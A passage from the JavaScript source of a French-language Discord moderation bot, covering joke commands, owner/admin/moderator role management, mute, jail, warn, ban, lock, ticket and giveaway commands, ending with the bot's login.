            .setDescription(`Je donne la note de **${score}/10** à : *${subject}*\n\n-# ⚠️ Résultats 100% aléatoires et fake.`);
        return message.reply({ embeds: [embed] });
    }

    if (command === 'horoscope') {
        const sign = args[0] || "ton signe";
        const predictions = [
            "Tu vas trébucher sur un câble aujourd'hui, fais gaffe.",
            "Une grosse somme d'argent va arriver... ou pas du tout.",
            "Tu vas manger un truc incroyable ce soir.",
            "Journée idéale pour ne rien faire et rester dans ton lit.",
            "Attention à ton chat, il prépare un coup d'État."
        ];
        const pred = predictions[Math.floor(Math.random() * predictions.length)];
        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setTitle(`🔮 Horoscope : ${sign}`)
            .setDescription(`${pred}\n\n-# ⚠️ Résultats 100% aléatoires et fake.`);
        return message.reply({ embeds: [embed] });
    }

    if (command === 'kiss') {
        const target = message.mentions.users.first();
        if (!target) return message.reply("❌ Mentionne quelqu'un à embrasser !");
        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setTitle('💋 Câlin / Bisou')
            .setDescription(`**${message.author}** fait un gros bisou plein d'amour à **${target}** ! ❤️\n\n-# ⚠️ Résultats 100% aléatoires et fake.`);
        return message.reply({ embeds: [embed] });
    }

    if (command === 'owners') {
        const ownerList = Array.from(botOwners).map(id => `┗ ID : \`${id}\``).join('\n');
        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setTitle('👑 Liste des Owners du bot')
            .setDescription(ownerList || "Aucun owner enregistré.");
        return message.reply({ embeds: [embed] });
    }

    if (command === 'owner') {
        if (!userIsSuperOwner) return message.reply("❌ Tu n'as pas assez de permissions.");
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        botOwners.add(targetUser.id);
        botOwners.add(targetUser.username.toLowerCase());
        return message.reply(`👑 L'utilisateur **${targetUser.tag}** a été ajouté comme Owner du bot !`);
    }

    if (command === 'unowner') {
        if (!userIsSuperOwner) return message.reply("❌ Tu n'as pas assez de permissions.");
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        botOwners.delete(targetUser.id);
        botOwners.delete(targetUser.username.toLowerCase());
        return message.reply(`🔒 L'utilisateur **${targetUser.tag}** n'est plus Owner du bot.`);
    }

    if (command === 'admin') {
        if (!userIsSuperOwner) return message.reply("❌ Tu n'as pas assez de permissions.");
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        const staff = getStaffRoles(message.guild.id);
        staff.admins.add(targetUser.id);
        staff.mods.delete(targetUser.id);
        return message.reply(`🛡️ L'utilisateur **${targetUser.tag}** est désormais **Admin** du bot !`);
    }

    if (command === 'mod') {
        if (!userIsSuperOwner && !userIsAdmin) return message.reply("❌ Tu n'as pas assez de permissions.");
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        const staff = getStaffRoles(message.guild.id);
        staff.mods.add(targetUser.id);
        return message.reply(`🛡️ L'utilisateur **${targetUser.tag}** est désormais **Modérateur** du bot !`);
    }

    const modCommands = ['clear', 'purge', 'snipe', 'lock', 'unlock', 'lockall', 'unlockall', 'slowmode', 'renew', 'createtext', 'createvoice', 'unmute', 'warn', 'warnings', 'jail', 'unjail', 'mute'];
    const adminCommands = ['bl', 'softbl', 'unbl', 'blist', 'unbanall', 'kick', 'setlog', 'setmuterole', 'setwelcome', 'setticketpanel', 'setticketcat', 'setticketlog', 'settickettitle', 'setticketdesc', 'setticketimage', 'ticketadd', 'gcreate', 'gend', 'greroll', 'glist', 'ticketsetup', 'antilink', 'antispam', 'antibot', 'addrole', 'delrole'];

    if (modCommands.includes(command)) {
        if (!userIsMod && !isUserAdminOrOwner) return message.reply("❌ Tu n'as pas assez de permissions.");
    }

    if (adminCommands.includes(command)) {
        if (!userIsAdmin && !userIsOwner && !message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return message.reply("❌ Tu n'as pas assez de permissions.");
        }
    }

    if (command === 'mute') {
        const targetMember = await fetchTargetMember(message, targetArg);
        const durationStr = args[1];
        const reason = args.slice(2).join(' ') || "Aucune raison";

        if (!targetMember || !durationStr) return message.reply("❌ Utilisation : `=mute <@membre> <durée> [raison]`");
        const ms = parseDuration(durationStr);
        if (!ms) return message.reply("❌ Durée invalide (ex: 10s, 5m, 2h).");

        try {
            await targetMember.timeout(ms, reason);
            sendLog(message.guild, new EmbedBuilder().setColor('#e74c3c').setTitle('🔇 Membre mute').setDescription(`**Modérateur :** ${message.author.tag}\n**Membre :** ${targetMember.user.tag}\n**Durée :** ${durationStr}\n**Raison :** ${reason}`).setTimestamp());
            return message.reply(`🔇 **${targetMember.user.tag}** a été mis en sourdine.`);
        } catch (e) { return message.reply("❌ Impossible de mute ce membre."); }
    }
    if (command === 'jail') {
        const targetMember = await fetchTargetMember(message, targetArg);
        const reason = args.slice(1).join(' ') || "Aucune raison";
        if (!targetMember) return message.reply("❌ Mentionne un membre valide.");

        try {
            const botRolePos = message.guild.members.me.roles.highest.position;
            const roleIds = targetMember.roles.cache.filter(r => r.id !== message.guild.id && !r.managed && r.position < botRolePos).map(r => r.id);
            jailDataMap.set(targetMember.id, roleIds);
            if (roleIds.length > 0) await targetMember.roles.remove(roleIds).catch(() => {});

            const jailChannel = await message.guild.channels.create({
                name: `jail-${targetMember.user.username}`,
                type: ChannelType.GuildText,
                permissionOverwrites: [
                    { id: message.guild.roles.everyone.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                    { id: targetMember.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ReadMessageHistory] }
                ]
            });

            await jailChannel.send({ content: `<@${targetMember.id}>`, embeds: [new EmbedBuilder().setColor('#2b2d31').setTitle('🔒 PRISON').setDescription(`Raison : ${reason}`)] });
            sendLog(message.guild, new EmbedBuilder().setColor('#e74c3c').setTitle('🔒 Jail').setDescription(`**Modérateur :** ${message.author.tag}\n**Membre :** ${targetMember.user.tag}\n**Salon :** ${jailChannel}`).setTimestamp());
            return message.reply(`🔒 Membre envoyé en jail : ${jailChannel}`);
        } catch (e) { return message.reply("❌ Erreur jail."); }
    }

    if (command === 'unjail') {
        const targetMember = await fetchTargetMember(message, targetArg);
        if (!targetMember) return message.reply("❌ Mentionne un membre valide.");

        try {
            const savedRoles = jailDataMap.get(targetMember.id);
            if (savedRoles && savedRoles.length > 0) {
                await targetMember.roles.add(savedRoles).catch(() => {});
                jailDataMap.delete(targetMember.id);
            }
            const jailChan = message.guild.channels.cache.find(c => c.name === `jail-${targetMember.user.username.toLowerCase()}`);
            if (jailChan) await jailChan.delete().catch(() => {});
            sendLog(message.guild, new EmbedBuilder().setColor('#2ecc71').setTitle('🔓 Unjail').setDescription(`**Modérateur :** ${message.author.tag}\n**Membre :** ${targetMember.user.tag}`).setTimestamp());
            return message.reply(`🔓 **${targetMember.user.tag}** libéré.`);
        } catch (e) { return message.reply("❌ Erreur unjail."); }
    }

    if (command === 'warn') {
        const targetMember = await fetchTargetMember(message, targetArg);
        if (!targetMember) return message.reply("❌ Mentionne un membre.");
        const reason = args.slice(1).join(' ') || "Aucune raison";
        
        let userWarns = warningsMap.get(targetMember.id) || [];
        userWarns.push({ reason, moderator: message.author.tag });
        warningsMap.set(targetMember.id, userWarns);

        sendLog(message.guild, new EmbedBuilder().setColor('#f39c12').setTitle('⚠️ Warn').setDescription(`**Modérateur :** ${message.author.tag}\n**Membre :** ${targetMember.user.tag}\n**Raison :** ${reason}`).setTimestamp());
        return message.reply(`⚠️ Avertissement enregistré (${userWarns.length}).`);
    }

    if (command === 'warnings') {
        const targetMember = await fetchTargetMember(message, targetArg);
        if (!targetMember) return message.reply("❌ Mentionne un membre.");
        const userWarns = warningsMap.get(targetMember.id) || [];
        if (userWarns.length === 0) return message.reply(`✅ Aucun avertissement.`);
        const list = userWarns.map((w, i) => `**#${i+1}** - ${w.reason} (Par ${w.moderator})`).join('\n');
        return message.reply({ embeds: [new EmbedBuilder().setColor('#2b2d31').setTitle(`⚠️ Warns de ${targetMember.user.tag}`).setDescription(list)] });
    }

    if (command === 'unmute') {
        const member = await fetchTargetMember(message, targetArg);
        if (!member) return message.reply("❌ Mentionne un membre.");
        try {
            await member.timeout(null);
            sendLog(message.guild, new EmbedBuilder().setColor('#2ecc71').setTitle('🔊 Unmute').setDescription(`**Modérateur :** ${message.author.tag}\n**Membre :** ${member.user.tag}`).setTimestamp());
            return message.reply(`✅ ${member.user.tag} unmute.`);
        } catch (e) { return message.reply("❌ Erreur."); }
    }

    if (command === 'lockall') {
        message.guild.channels.cache.filter(c => c.type === ChannelType.GuildText).forEach(c => c.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: false }).catch(() => {}));
        sendLog(message.guild, new EmbedBuilder().setColor('#e74c3c').setTitle('🔒 Lockall').setDescription(`Par ${message.author.tag}`).setTimestamp());
        return message.reply("🔒 Tous les salons verrouillés !");
    }

    if (command === 'unlockall') {
        message.guild.channels.cache.filter(c => c.type === ChannelType.GuildText).forEach(c => c.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: null }).catch(() => {}));
        sendLog(message.guild, new EmbedBuilder().setColor('#2ecc71').setTitle('🔓 Unlockall').setDescription(`Par ${message.author.tag}`).setTimestamp());
        return message.reply("🔓 Tous les salons déverrouillés !");
    }

    if (command === 'ticketsetup') {
        return message.reply({ embeds: [getTicketDashboardEmbed(message.guild, config)], components: [getTicketDashboardRows()] });
    }

    if (command === 'setticketpanel') {
        const chan = message.mentions.channels.first();
        if (!chan) return message.reply("❌ Mentionne un salon (ex: `=setticketpanel #support`).");
        config.ticketConfig.panelChannel = chan.id;
        return message.reply(`✅ Salon du panneau défini sur ${chan}`);
    }

    if (command === 'setticketcat') {
        const catId = args[0];
        if (!catId) return message.reply("❌ Fournis l'ID de la catégorie Discord.");
        config.ticketConfig.categoryDestination = catId;
        return message.reply(`✅ Catégorie de destination des tickets configurée.`);
    }

    if (command === 'setticketlog') {
        const chan = message.mentions.channels.first();
        if (!chan) return message.reply("❌ Mentionne un salon de logs.");
        config.ticketConfig.logChannel = chan.id;
        return message.reply(`✅ Salon des logs de tickets défini sur ${chan}`);
    }

    if (command === 'settickettitle') {
        const title = args.join(' ');
        if (!title) return message.reply("❌ Fournis un titre.");
        config.ticketConfig.title = title;
        return message.reply(`✅ Titre mis à jour : **${title}**`);
    }

    if (command === 'setticketdesc') {
        const desc = args.join(' ');
        if (!desc) return message.reply("❌ Fournis une description.");
        config.ticketConfig.description = desc;
        return message.reply("✅ Description mise à jour !");
    }

    if (command === 'setticketimage') {
        const url = args[0];
        if (!url) return message.reply("❌ Fournis un lien d'image ou GIF.");
        config.ticketConfig.imageUrl = url;
        return message.reply("✅ Image / GIF enregistré !");
    }

    if (command === 'ticketadd') {
        const name = args[0];
        const emoji = args[1] || '🎫';
        const role = message.mentions.roles.first();
        if (!name) return message.reply("❌ Utilisation : `=ticketadd <Nom> <Emoji> [@RôleStaff]`");

        const categoryId = `ticket_${name.toLowerCase()}`;
        let existing = config.ticketConfig.categories.find(c => c.id === categoryId);
        if (existing) {
            existing.emoji = emoji;
            if (role) existing.roleId = role.id;
        } else {
            config.ticketConfig.categories.push({
                id: categoryId,
                name: name,
                emoji: emoji,
                roleId: role ? role.id : null,
                description: `Ouvrir un ticket ${name}`
            });
        }
        return message.reply(`✅ Catégorie de ticket **${name}** (${emoji}) configurée avec succès !`);
    }
    if (command === 'setlog') {
        const channel = message.mentions.channels.first() || message.channel;
        config.logChannel = channel.id;
        return message.reply(`✅ Salon de logs globaux défini sur ${channel} !`);
    }

    if (command === 'setwelcome') {
        const channel = message.mentions.channels.first();
        const welcomeText = args.slice(1).join(' ');
        if (!channel || !welcomeText) return message.reply("Utilisation : `=setwelcome <#salon> <message>`");
        config.welcomeChannel = channel.id;
        config.welcomeText = welcomeText;
        return message.reply(`✅ Salon de bienvenue configuré !`);
    }

    if (command === 'gcreate') {
        const duration = args[0], winnersCount = parseInt(args[1]), prize = args.slice(2).join(' ');
        if (!duration || isNaN(winnersCount) || !prize) return message.reply("Utilisation : `=gcreate <durée> <gagnants> <prix>`");

        const embed = new EmbedBuilder().setColor('#2b2d31').setTitle("🎉 GIVEAWAY 🎉").setDescription(`**Lot :** ${prize}\n**Gagnants :** ${winnersCount}`).setFooter({ text: `Par ${message.author.tag}` });
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('join_giveaway').setLabel('🎉 Participer').setStyle(ButtonStyle.Success));
        await message.channel.send({ embeds: [embed], components: [row] });
        return message.reply("🎉 Giveaway lancé !");
    }

    if (['antilink', 'antispam', 'antibot'].includes(command)) {
        const state = args[0]?.toLowerCase();
        if (state !== 'on' && state !== 'off') return message.reply(`Utilisation : \`=${command} on/off\``);
        config[command] = (state === 'on');
        sendLog(message.guild, new EmbedBuilder().setColor('#9b59b6').setTitle('🛡️ Automod').setDescription(`**Modérateur :** ${message.author.tag}\n**Protection :** \`${command.toUpperCase()}\`\n**État :** **${state.toUpperCase()}**`).setTimestamp());
        return message.reply(`🛡️ Protection **${command.toUpperCase()}** réglée sur **${state.toUpperCase()}**`);
    }

    if (command === 'bl') {
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID ou une mention valide.");
        const reason = args.slice(1).join(' ') || "Aucune raison";
        try {
            await message.guild.members.ban(targetUser.id, { reason });
            sendLog(message.guild, new EmbedBuilder().setColor('#c0392b').setTitle('🔨 Ban').setDescription(`**Modérateur :** ${message.author.tag}\n**Utilisateur :** ${targetUser.tag}\n**Raison :** ${reason}`).setTimestamp());
            return message.reply(`🔨 **${targetUser.tag}** banni.`);
        } catch (e) { return message.reply("❌ Erreur ban."); }
    }

    else if (command === 'softbl') {
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un ID valide.");
        try {
            await message.guild.members.ban(targetUser.id, { deleteMessageSeconds: 604800 });
            await message.guild.members.unban(targetUser.id);
            sendLog(message.guild, new EmbedBuilder().setColor('#e67e22').setTitle('🌪️ Softban').setDescription(`**Modérateur :** ${message.author.tag}\n**Utilisateur :** ${targetUser.tag}`).setTimestamp());
            return message.reply(`🌪️ Softban effectué pour **${targetUser.tag}**.`);
        } catch (e) { return message.reply("❌ Erreur."); }
    }

    else if (command === 'unbl') {
        const userId = targetArg?.replace(/<@!?|>/g, '');
        if (!userId) return message.reply("Donne l'ID à débannir.");
        try {
            const user = await client.users.fetch(userId);
            await message.guild.members.unban(userId);
            sendLog(message.guild, new EmbedBuilder().setColor('#2ecc71').setTitle('🔓 Unban').setDescription(`**Modérateur :** ${message.author.tag}\n**Utilisateur :** ${user.tag}`).setTimestamp());
            return message.reply(`🔓 **${user.tag}** débanni.`);
        } catch (e) { return message.reply("❌ Introuvable."); }
    }

    else if (command === 'blist') {
        const bans = await message.guild.bans.fetch();
        const banList = bans.map(b => `• **${b.user.tag}** (\`${b.user.id}\`)`).slice(0, 15).join('\n') || "Aucun banni.";
        return message.reply({ embeds: [new EmbedBuilder().setColor('#2b2d31').setTitle("🔨 Bannissements").setDescription(banList)] });
    }

    else if (command === 'unbanall') {
        const bans = await message.guild.bans.fetch();
        if (bans.size === 0) return message.reply("Aucun banni.");
        for (const [id] of bans) await message.guild.members.unban(id).catch(() => {});
        sendLog(message.guild, new EmbedBuilder().setColor('#2ecc71').setTitle('🔓 Unbanall').setDescription(`Par ${message.author.tag} (${bans.size} unbans)`).setTimestamp());
        return message.reply(`🔓 Tous les utilisateurs (${bans.size}) ont été débannis.`);
    }

    else if (command === 'kick') {
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Fournis un membre valide.");
        const member = await message.guild.members.fetch(targetUser.id).catch(() => null);
        if (!member) return message.reply("Membre introuvable.");
        const reason = args.slice(1).join(' ') || "Aucune raison";
        try {
            await member.kick(reason);
            sendLog(message.guild, new EmbedBuilder().setColor('#e67e22').setTitle('👢 Kick').setDescription(`**Modérateur :** ${message.author.tag}\n**Membre :** ${targetUser.tag}\n**Raison :** ${reason}`).setTimestamp());
            return message.reply(`✅ **${targetUser.tag}** expulsé.`);
        } catch (e) { return message.reply("❌ Erreur."); }
    }

    else if (command === 'clear') {
        const count = parseInt(args[0]);
        if (isNaN(count) || count < 1 || count > 50) return message.reply("❌ Donne un nombre entre 1 et 50.");
        try {
            await message.delete();
            const fetched = await message.channel.messages.fetch({ limit: count });
            await message.channel.bulkDelete(fetched, true);
            const confirmation = await message.channel.send(`🧹 ${fetched.size} messages supprimés.`);
            setTimeout(() => confirmation.delete().catch(() => {}), 3000);
        } catch (e) { return message.reply("❌ Erreur suppression."); }
    }

    else if (command === 'purge') {
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Mentionne un membre à purger.");
        try {
            const fetched = await message.channel.messages.fetch({ limit: 100 });
            const userMsgs = fetched.filter(m => m.author.id === targetUser.id).first(30);
            if (userMsgs.length === 0) return message.reply("Aucun message trouvé.");
            await message.channel.bulkDelete(userMsgs, true);
            const conf = await message.channel.send(`🧹 ${userMsgs.length} messages purgés pour ${targetUser.tag}.`);
            setTimeout(() => conf.delete().catch(() => {}), 3000);
        } catch (e) { return message.reply("❌ Erreur purge."); }
    }

    else if (command === 'snipe') {
        const sniped = snipeCache.get(message.channel.id);
        if (!sniped) return message.reply("❌ Aucun message récemment supprimé.");
        return message.reply({ embeds: [new EmbedBuilder().setColor('#2b2d31').setAuthor({ name: sniped.author, iconURL: sniped.avatar }).setDescription(sniped.content).setFooter({ text: `Supprimé à ${sniped.time}` })] });
    }

    else if (command === 'lock') {
        try {
            await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: false });
            sendLog(message.guild, new EmbedBuilder().setColor('#e74c3c').setTitle('🔒 Salon verrouillé').setDescription(`Par ${message.author.tag} dans <#${message.channel.id}>`).setTimestamp());
            return message.reply("🔒 Salon verrouillé.");
        } catch (e) { return message.reply("❌ Erreur."); }
    }

    else if (command === 'unlock') {
        try {
            await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: null });
            sendLog(message.guild, new EmbedBuilder().setColor('#e74c3c').setTitle('🔓 Salon déverrouillé').setDescription(`Par ${message.author.tag} dans <#${message.channel.id}>`).setTimestamp());
            return message.reply("🔓 Salon déverrouillé.");
        } catch (e) { return message.reply("❌ Erreur."); }
    }

    else if (command === 'slowmode') {
        const sec = parseInt(args[0]);
        if (isNaN(sec) || sec < 0 || sec > 21600) return message.reply("Donne un nombre entre 0 et 21600.");
        try {
            await message.channel.setRateLimitPerUser(sec);
            return message.reply(sec === 0 ? "⏱️ Mode lent désactivé." : `⏱️ Mode lent réglé sur ${sec}s.`);
        } catch (e) { return message.reply("❌ Erreur."); }
    }

    else if (command === 'renew') {
        try {
            const pos = message.channel.position;
            const newChan = await message.channel.clone({ position: pos });
            await message.channel.delete();
            newChan.send("🔄 Salon régénéré avec succès !");
        } catch (e) { return message.reply("❌ Erreur."); }
    }

    else if (command === 'createtext') {
        const name = args.join('-');
        if (!name) return message.reply("Donne un nom.");
        try {
            await message.guild.channels.create({ name, type: ChannelType.GuildText });
            return message.reply(`✅ Salon texte \`${name}\` créé.`);
        } catch (e) { return message.reply("❌ Erreur."); }
    }

    else if (command === 'createvoice') {
        const name = args.join(' ');
        if (!name) return message.reply("Donne un nom.");
        try {
            await message.guild.channels.create({ name, type: ChannelType.GuildVoice });
            return message.reply(`✅ Salon vocal \`${name}\` créé.`);
        } catch (e) { return message.reply("❌ Erreur."); }
    }
});

client.login(process.env.DISCORD_TOKEN);
